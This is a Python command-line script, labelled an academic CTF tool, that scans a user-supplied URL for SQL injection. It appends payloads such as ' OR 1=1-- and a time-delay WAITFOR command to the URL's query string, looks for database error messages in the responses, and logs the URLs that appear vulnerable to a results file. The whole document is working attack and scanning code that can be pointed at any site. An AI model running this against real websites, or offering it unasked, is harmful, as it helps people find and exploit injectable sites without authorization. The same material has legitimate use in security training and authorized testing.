import requests
import time
import os
from colorama import Fore, Style, init

# Inicializa o colorama
init(autoreset=True)

# Payloads básicos para testar SQL Injection
payloads = [
    "'", "\"", "'--", "\"--", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "'; WAITFOR DELAY '0:0:5'--"
]

# Possíveis mensagens de erro que indicam falha SQL
error_signatures = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql error",
    "supplied argument is not a valid",
    "Microsoft OLE DB Provider for SQL Server",
    "mysql_fetch",
    "pg_query()",
    "ORA-00933",  # Oracle
    "ORA-01756"
]

def test_sql_injection(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }

    vulnerable = False

    for payload in payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url, headers=headers, timeout=8)
            content = response.text.lower()

            for error in error_signatures:
                if error in content:
                    print(Fore.GREEN + f"[+] Vulnerability found at: {test_url}")
                    with open("vuln_results.txt", "a") as f:
                        f.write(test_url + "\n")
                    vulnerable = True
                    break

            if vulnerable:
                break
            else:
                print(Fore.YELLOW + f"[-] Not vulnerable: {test_url} (Status {response.status_code})")

        except requests.exceptions.Timeout:
            print(Fore.RED + f"[!] Timeout: {test_url}")
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[!] Request failed: {e}")
        time.sleep(0.5)

def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.CYAN + """
   ______     ______     __         ______     __         ______    
  /\  ___\   /\  __ \   /\ \       /\  ___\   /\ \       /\  ___\   
  \ \___  \  \ \ \/\ \  \ \ \____  \ \  __\   \ \ \____  \ \  __\   
   \/\_____\  \ \_____\  \ \_____\  \ \_____\  \ \_____\  \ \_____\ 
    \/_____/   \/_____/   \/_____/   \/_____/   \/_____/   \/_____/ 
                                                                    
    SQL Injection Test Tool - Academic CTF Edition
    """)

    try:
        target = input(Fore.GREEN + "[*] Enter base URL to test (e.g. http://site.com/page.php?id=1): ").strip()
        if not target:
            print(Fore.RED + "[!] No URL entered.")
            return

        test_sql_injection(target)

    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Aborted by user.")

if __name__ == "__main__":
    main()
